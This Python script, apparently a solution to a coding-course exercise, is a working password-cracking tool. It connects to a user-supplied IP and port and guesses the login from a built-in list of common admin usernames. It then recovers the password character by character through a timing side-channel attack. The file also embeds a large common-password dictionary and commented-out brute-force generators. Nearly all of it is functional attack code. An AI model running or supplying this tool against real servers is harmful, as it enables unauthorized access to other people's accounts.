import argparse
import itertools
import json
import socket
import string
import time


class Hacker:

    def __init__(self, ip_address, port):
        self.count_passw = 1
        self.index_login = -1
        self.ip_address = ip_address
        self.port = port
        self.password = ""
        self.stand_passwords = self.get_passw_file()
        self.stand_login = self.get_login_file()
        self.get_gen_other_passw()

    def get_passw_file(self):
        stand_passwords = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
6969
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
william
corvette
hello
martin
heather
secret
merlin
diamond
1234qwer
gfhjkm
hammer
silver
222222
88888888
anthony
justin
test
bailey
q1w2e3r4t5
patrick
internet
scooter
orange
11111
golfer
cookie
richard
samantha
bigdog
guitar
jackson
whatever
mickey
chicken
sparky
snoopy
maverick
phoenix
camaro
peanut
morgan
welcome
falcon
cowboy
ferrari
samsung
andrea
smokey
steelers
joseph
mercedes
dakota
arsenal
eagles
melissa
boomer
booboo
spider
nascar
monster
tigers
yellow
xxxxxx
123123123
gateway
marina
diablo
bulldog
qwer1234
compaq
purple
hardcore
banana
junior
hannah
123654
porsche
lakers
iceman
money
cowboys
987654
london
tennis
999999
ncc1701
coffee
scooby
0000
miller
boston
q1w2e3r4
brandon
yamaha
chester
mother
forever
johnny
edward
333333
oliver
redsox
player
nikita
knight
fender
barney
midnight
please
brandy
chicago
badboy
slayer
rangers
charles
angel
flower
rabbit
wizard
bigdick
jasper
enter
rachel
chris
steven
winner
adidas
victoria
natasha
1q2w3e4r
jasmine
winter
prince
panties
marine
ghbdtn
fishing
cocacola
casper
james
232323
raiders
888888
marlboro
gandalf
asdfasdf
crystal
87654321
12344321
golden
8675309
panther
lauren
angela
thx1138
angels
madison
winston
shannon
mike
toyota
jordan23
canada
sophie
Password
apples
tiger
razz
123abc
pokemon
qazxsw
55555
qwaszx
muffin
johnson
murphy
cooper
jonathan
liverpoo
david
danielle
159357
jackie
1990
123456a
789456
turtle
abcd1234
scorpion
qazwsxedc
101010
butter
carlos
password1
dennis
slipknot
qwerty123
asdf
1991
black
startrek
12341234
cameron
newyork
rainbow
nathan
john
1992
rocket
viking
redskins
asdfghjkl
1212
sierra
peaches
gemini
doctor
wilson
sandra
helpme
qwertyui
victor
florida
dolphin
pookie
captain
tucker
blue
liverpool
theman
bandit
dolphins
maddog
packers
jaguar
lovers
nicholas
united
tiffany
maxwell
zzzzzz
nirvana
jeremy
monica
elephant
giants
hotdog
rosebud
success
debbie
mountain
444444
xxxxxxxx
warrior
1q2w3e4r5t
q1w2e3
123456q
albert
metallic
lucky
azerty
7777
alex
bond007
alexis
1111111
samson
5150
willie
scorpio
bonnie
gators
benjamin
voodoo
driver
dexter
2112
jason
calvin
freddy
212121
creative
12345a
sydney
rush2112
1989
asdfghjk
red123
bubba
4815162342
passw0rd
trouble
gunner
happy
gordon
legend
jessie
stella
qwert
eminem
arthur
apple
nissan
bear
america
1qazxsw2
nothing
parker
4444
rebecca
qweqwe
garfield
01012011
beavis
69696969
jack
asdasd
december
2222
102030
252525
11223344
magic
apollo
skippy
315475
girls
kitten
golf
copper
braves
shelby
godzilla
beaver
fred
tomcat
august
buddy
airborne
1993
1988
lifehack
qqqqqq
brooklyn
animal
platinum
phantom
online
xavier
darkness
blink182
power
fish
green
789456123
voyager
police
travis
12qwaszx
heaven
snowball
lover
abcdef
00000
pakistan
007007
walter
playboy
blazer
cricket
sniper
donkey
willow
loveme
saturn
therock
redwings
bigboy
pumpkin
trinity
williams
nintendo
digital
destiny
topgun
runner
marvin
guinness
chance
bubbles
testing
fire
november
minecraft
asdf1234
lasvegas
sergey
broncos
cartman
private
celtic
birdie
little
cassie
babygirl
donald
beatles
1313
family
12121212
school
louise
gabriel
eclipse
fluffy
147258369
lol123
explorer
beer
nelson
flyers
spencer
scott
lovely
gibson
doggie
cherry
andrey
snickers
buffalo
pantera
metallica
member
carter
qwertyu
peter
alexande
steve
bronco
paradise
goober
5555
samuel
montana
mexico
dreams
michigan
carolina
friends
magnum
surfer
maximus
genius
cool
vampire
lacrosse
asd123
aaaa
christin
kimberly
speedy
sharon
carmen
111222
kristina
sammy
racing
ou812
sabrina
horses
0987654321
qwerty1
baby
stalker
enigma
147147
star
poohbear
147258
simple
12345q
marcus
brian
1987
qweasdzxc
drowssap
hahaha
caroline
barbara
dave
viper
drummer
action
einstein
genesis
hello1
scotty
friend
forest
010203
hotrod
google
vanessa
spitfire
badger
maryjane
friday
alaska
1232323q
tester
jester
jake
champion
billy
147852
rock
hawaii
chevy
420420
walker
stephen
eagle1
bill
1986
october
gregory
svetlana
pamela
1984
music
shorty
westside
stanley
diesel
courtney
242424
kevin
hitman
mark
12345qwert
reddog
frank
qwe123
popcorn
patricia
aaaaaaaa
1969
teresa
mozart
buddha
anderson
paul
melanie
abcdefg
security
lucky1
lizard
denise
3333
a12345
123789
ruslan
stargate
simpsons
scarface
eagle
123456789a
thumper
olivia
naruto
1234554321
general
cherokee
a123456
vincent
Usuckballz1
spooky
qweasd
free
frankie
douglas
death
1980
loveyou
kitty
kelly
veronica
suzuki
semperfi
penguin
mercury
liberty
spirit
scotland
natalie
marley
vikings
system
king
allison
marshall
1979
098765
qwerty12
hummer
adrian
1985
vfhbyf
sandman
rocky
leslie
antonio
98765432
4321
softball
passion
mnbvcxz
passport
rascal
howard
franklin
bigred
alexander
homer
redrum
jupiter
claudia
55555555
141414
zaq12wsx
patches
raider
infinity
andre
54321
galore
college
russia
kawasaki
bishop
77777777
vladimir
money1
freeuser
wildcats
francis
disney
budlight
brittany
1994
00000000
sweet
oksana
honda
domino
bulldogs
brutus
swordfis
norman
monday
jimmy
ironman
ford
fantasy
9999
7654321
PASSWORD
duncan
1977
jeffrey
house
dancer
brooke
timothy
super
marines
justice
digger
connor
patriots
karina
202020
molly
everton
tinker
alicia
rasdzv3
poop
pearljam
stinky
colorado
123123a
water
test123
ncc1701d
motorola
ireland
asdfg
matt
houston
boogie
zombie
accord
vision
bradley
reggie
kermit
froggy
ducati
avalon
6666
9379992
sarah
saints
logitech
chopper
852456
simpson
madonna
juventus
claire
159951
zachary
yfnfif
wolverin
warcraft
hello123
extreme
peekaboo
fireman
eugene
brenda
123654789
russell
panthers
georgia
smith
skyline
jesus
elizabet
spiderma
smooth
pirate
empire
bullet
8888
virginia
valentin
psycho
predator
arizona
134679
mitchell
alyssa
vegeta
titanic
christ
goblue
fylhtq
wolf
mmmmmm
kirill
indian
hiphop
baxter
awesome
people
danger
roland
mookie
741852963
1111111111
dreamer
bambam
arnold
1981
skipper
serega
rolltide
elvis
changeme
simon
1q2w3e
lovelove
fktrcfylh
denver
tommy
mine
loverboy
hobbes
happy1
alison
nemesis
chevelle
cardinal
burton
picard
151515
tweety
michael1
147852369
12312
xxxx
windows
turkey
456789
1974
vfrcbv
sublime
1975
galina
bobby
newport
manutd
american
alexandr
1966
victory
rooster
qqq111
madmax
electric
a1b2c3
wolfpack
spring
phpbb
lalala
spiderman
eric
darkside
classic
raptor
123456789q
hendrix
1982
wombat
avatar
alpha
zxc123
crazy
hard
england
brazil
1978
01011980
wildcat
polina
freepass
lauragpe
the0toky
redhead
woody
snowman
tiger1
stingray
kristen
jerry
789455
garcia
lights
chronic
alison77
service
service1
srinivas
katie
brother
single
cannon
11georgia
tattoo
texas
party
taurus
wolves
flowers
tarheels
fisher
testtest
mature
bass
brass
catch22
juice
alpha1
hawkeye
machine
pyramid
vegetaaa
katana
moose
tinkerr
coyote
inside
pepsi
letmein1
control
maiden
quan
nong
neng
buttons
biao
xuan""".split('\n')
        return stand_passwords

    def get_login_file(self):
        stand_login = """admin
Admin
admin1
admin2
admin3
user1
user2
root
default
new_user
some_user
new_admin
administrator
Administrator
superuser
super
su
alex
suser
rootuser
adminadmin
useruser
superadmin
username
username1""".split('\n')
        return stand_login

    def get_login(self):
        self.index_login += 1
        return self.stand_login[self.index_login]

    # def get_password_gen(self, stand_passw):
    #     # self.passwords_gen = itertools.combinations_with_replacement(self.letter, self.start_index)
    #     self.passwords_gen = map(lambda x: ''.join(x),
    #                              itertools.product(*([letter.lower(), letter.upper()] for letter in stand_passw)))
    #
    # def get_password(self):
    #     while 1:
    #         try:
    #             password = ''.join(next(self.passwords_gen))
    #             break
    #         except StopIteration:
    #             self.index_passw += 1
    #             self.get_password_gen(self.stand_passwords[self.index_passw])
    #     return password

    def get_letter_passw(self, login, client_socket, first):
        result = {
            'time': 0.0,
            'password': first
        }
        letters = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        password = first
        for lett in letters:
            data = {
                "login": login,
                "password": first + lett
            }
            client_socket.send(json.dumps(data).encode())
            start = time.perf_counter()
            response = client_socket.recv(1024)
            response_answ = self.encode_response(response)
            end = time.perf_counter()
            total_time = end - start
            if result['time'] < total_time:
                result['time'] = total_time
                result['password'] = first + lett
            if response_answ != "Wrong password!":
                result['password'] = first + lett
                break
        return result['password'], response_answ, total_time

    def encode_response(self, response):
        response = response.decode()
        return json.loads(response)["result"]

    def get_login_from_server(self, client_socket):
        response_answ = ""
        login = ""
        while response_answ != "Wrong password!":
            login = self.get_login()
            data = {
                "login": login,
                "password": ' '
            }
            client_socket.send(json.dumps(data).encode())
            response = client_socket.recv(1024)
            response_answ = self.encode_response(response)
        return login

    def get_gen_other_passw(self):
        letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self.passwords_gen = itertools.product(letters, repeat=self.count_passw)

    def get_other_passw(self):
        while 1:
            try:
                password = ''.join(next(self.passwords_gen))
                break
            except StopIteration:
                self.count_passw += 1
                self.get_gen_other_passw()
        return password

    def get_responce(self):
        fp = open('foo.txt', 'w')
        with socket.socket() as client_socket:
            address = (self.ip_address, self.port)
            client_socket.connect(address)
            login = self.get_login_from_server(client_socket)
            passw_letter, response_answ, total_time = self.get_letter_passw(login, client_socket, '')
            password = passw_letter
            while response_answ != "Connection success!":
                password, response_answ, total_time = self.get_letter_passw(login, client_socket, password)

                # password = passw_letter + self.get_other_passw()
                # data = {
                #     "login": login,
                #     "password": password
                # }
                # client_socket.send(json.dumps(data).encode())
                # response = client_socket.recv(1024)
                # response_answ = self.encode_response(response)
                fp.write(f"{login}\t{password}\t{response_answ}\t{total_time}\n")
        fp.close()

        print(json.dumps({
            "login": login,
            "password": password
        }))

    # def get_responce(self):
    #     fp = open('foo.txt', 'w')
    #     with socket.socket() as client_socket:
    #         address = (self.ip_address, self.port)
    #         client_socket.connect(address)
    #         login = self.get_login_from_server(client_socket)
    #         letters = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    #         for lett in letters:
    #             data = {
    #                 "login": login,
    #                 "password": lett
    #             }
    #             start = time.perf_counter()
    #             client_socket.send(json.dumps(data).encode())
    #             response = client_socket.recv(1024)
    #             response_answ = self.encode_response(response)
    #             end = time.perf_counter()
    #             total_time = end - start
    #
    #             fp.write(f"{login}\t{lett}\t{response_answ}\t{total_time}\n")
    #     fp.close()




parser = argparse.ArgumentParser(
    description="Hello! My name is Steven, and I am your personal assistant! These are the things I can do:")
parser.add_argument("ip_address", help="ip_address", type=str)
parser.add_argument("port", help="port", type=int)

args = parser.parse_args()

# print(args.ip_address, int(args.port), args.password, sep='\t')
new_hack = Hacker(ip_address=args.ip_address, port=args.port)
new_hack.get_responce()
# #


# passwords_gen = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in 'qwerty')))
# 
# while 1:
#     try:
#         print(''.join(next(passwords_gen)))
#     except StopIteration:
#         break

# passwords_gen = itertools.product('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', repeat=2)
#
# while 1:
#     try:
#         print(''.join(next(passwords_gen)))
#     except StopIteration:
#         break
